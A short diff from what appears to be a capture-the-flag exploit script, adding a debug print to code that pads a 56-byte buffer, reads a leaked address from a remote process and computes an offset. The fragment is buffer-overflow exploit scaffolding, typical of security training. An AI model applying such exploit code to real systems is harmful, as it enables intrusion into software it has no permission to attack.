@@ -15,6 +15,7 @@ buffer = 'A' * 56
 
 io.sendline('throwaway')
 response = str(io.recvline()) # 'b"Yes I\'m going to win: 0x000xyz\\n"'
+print(response)
 
 main_address = re.search("0x[0-9a-f]+", response).group()
 offset = 0x13
